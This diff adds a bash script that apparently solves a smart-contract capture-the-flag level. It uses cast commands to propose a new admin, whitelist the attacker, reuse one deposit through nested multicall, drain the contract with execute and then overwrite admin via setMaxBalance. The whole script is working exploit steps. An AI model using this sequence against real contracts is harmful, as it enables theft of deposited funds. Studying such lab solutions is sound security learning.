@@ -1,0 +1,18 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+
+CON=0xD1D614184C06f40c5f3f017CE6Af33efFa928bf9
+
+# cast send --private-key $KEY $CON 'proposeNewAdmin(address)' $ADDR
+# cast send --private-key $KEY $CON 'addToWhitelist(address)' $address
+
+# BALANCE=$(cast balance $CON)
+# DEPOSIT=$(cast calldata 'deposit()')
+# MULTICALL_DEPOSIT=$(cast calldata 'multicall(bytes[] calldata data)' "[$DEPOSIT]")
+# DRAIN=$(cast calldata 'execute(address to, uint256 value, bytes calldata data)' $ADDR $(( 2 * $BALANCE )) "")
+# cast send --private-key $KEY $CON --value $BALANCE 'multicall(bytes[] calldata data)' "[$DEPOSIT,$MULTICALL_DEPOSIT,$DRAIN]"
+
+cast send --private-key $KEY $CON  'setMaxBalance(uint)' $ADDR
